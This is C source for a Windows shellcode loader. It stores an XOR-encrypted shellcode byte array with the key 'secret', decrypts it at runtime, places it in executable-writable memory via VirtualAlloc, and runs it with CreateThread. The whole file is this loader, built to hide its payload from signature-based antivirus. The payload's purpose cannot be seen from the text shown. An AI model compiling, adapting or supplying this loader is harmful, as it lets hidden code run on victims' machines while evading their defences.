#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>

int main(int argc, char *argv[]) {
        if (argc == 2) {
        unsigned char shellcode[] = "\x8f\x8d\xe1\x72\x65\x74\x13\xec\x86\x43\xa5\x10\xf8\x35\x53\xf9\x37\x78\xf8\x37\x77\xf9\x17\x5c\x7c\xd2\x29\x54\x54\x8b\xdf\x59\x2\xe\x67\x58\x53\xa4\xac\x7f\x64\xb3\x91\x97\x31\x25\xee\x26\x63\xee\x29\x4e\xee\x38\x62\x1d\x80\x3a\x64\xa5\x22\xee\x3a\x52\x64\xa7\xf8\x2c\x7b\x91\x5f\x3d\xf8\x51\xe8\x73\xb3\x45\x8c\xc9\xa2\xbd\x68\x75\xb4\x5d\x83\x7\x93\x77\xe\x9d\x58\xf\x41\x1\x97\x3d\xe8\x2a\x41\x75\xa0\x3\xe8\x7e\x2e\xff\x2b\x79\x62\xa1\xee\x70\xf8\x64\xb3\xfb\x21\x50\x57\x3e\x38\x13\x3c\x2e\x22\x9a\x83\x2d\x3a\x2e\xf8\x77\x88\xff\x38\x1e\x72\xe8\xe6\xc0\x65\x74\x73\x35\xb\x43\xee\x1b\xf4\x9a\xb6\xc9\x95\xc1\xd1\x33\xb\xd4\xf0\xc9\xee\x9a\xb6\x4e\x63\x8\x79\xe5\x98\x92\x10\x71\xc8\x22\x70\x0\xa\x1e\x73\x36\x9c\xa7\x6\x19\x17\x4b\x6\xa\x0\x54\x5c\x6\x43\x1c\x0\x0\x53\x10\x10\x17\x17\x54\xb\x4\xd\x13\x45\x5e\x2b\x4\xd\x13\x54\x46\x40\x45\x4c\x33\x21\x30\x53\x43\x45\x52\xb\x11\x7\x45\xf\x1d\x6\x15\x1f\x2\x11\x1d\x10\x4\x53\x24\x7\x1f\xc\x1a\x1a\x16\x17\x0\x4\x0\x1c\x17\x10\x52\x1d\x15\x1d\x4\x43\x5d\x24\x30\x37\x65";
        char key[] = "secret";

        unsigned int data_len = sizeof(shellcode);
        unsigned int key_len = sizeof(key);

        int j;
        j = 0;
        for (int i = 0; i < data_len; i++) {
                if (j == key_len - 1) j = 0;
                shellcode[i] = shellcode[i] ^ key[j];
                j++;
        }

        LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        MoveMemory(alloc_mem, shellcode, sizeof(shellcode));

        HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
        WaitForSingleObject(tHandle, INFINITE);

        return 0;
        }
}
